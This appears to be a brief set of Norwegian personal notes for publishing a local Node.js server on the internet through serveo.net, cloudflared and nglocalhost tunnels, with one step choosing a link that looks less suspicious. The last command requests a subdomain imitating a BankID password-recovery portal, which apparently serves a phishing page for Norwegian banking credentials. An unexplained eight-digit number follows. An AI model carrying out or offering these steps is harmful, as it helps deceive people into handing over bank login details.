1. åpne terminal
2. tast inn: node server.js
3. åpne ny terminal
4. tast inn: ssh -R 80:localhost:3000 serveo.net
5. vis servero ikke funker bruk cloudflare:
6. tast inn: npm install -g cloudflared
7. tast inn: cloudflared tunnel --url http://localhost:3000
8. vis ikke ekkel link bruk ssh -R 80:localhost:3000 nglocalhost.com

ssh -R bankidportal-passordgjenoppreting80:localhost:3000 serveo.net

45575487